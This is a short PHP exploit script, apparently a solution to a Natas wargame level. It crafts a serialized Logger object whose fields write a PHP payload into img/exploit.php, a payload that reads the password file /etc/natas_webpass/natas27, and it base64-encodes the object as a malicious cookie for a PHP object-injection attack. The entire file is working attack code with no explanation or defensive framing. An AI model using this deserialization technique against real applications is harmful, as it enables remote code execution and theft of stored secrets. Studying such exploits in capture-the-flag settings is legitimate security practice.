<?php

class Logger
{
	private $logFile;
	private $initMsg;
	private $exitMsg;
	
	function __construct()
	{
		$this->initMsg="rekt\n";
		$this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
		
		$this->logFile = "img/exploit.php";
		
	}
}


function decode_cookie($cookie)
{
	$data = unserialize(base64_decode($cookie));
	return $data;
}
function encode_cookie($data)
{
	$newcookie = base64_encode(serialize($data));
	return $newcookie;
}
	#$data = decode_cookie("YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjAiO3M6MjoieTEiO3M6MToiMCI7czoyOiJ4MiI7czoxOiIxIjtzOjI6InkyIjtzOjE6IjEiO319");
	#print_r($data);
	#print("n");
	
	$exploit = new Logger();
	$exploited_cookie = encode_cookie($exploit);
	print($exploited_cookie);
	print("\n");
?>
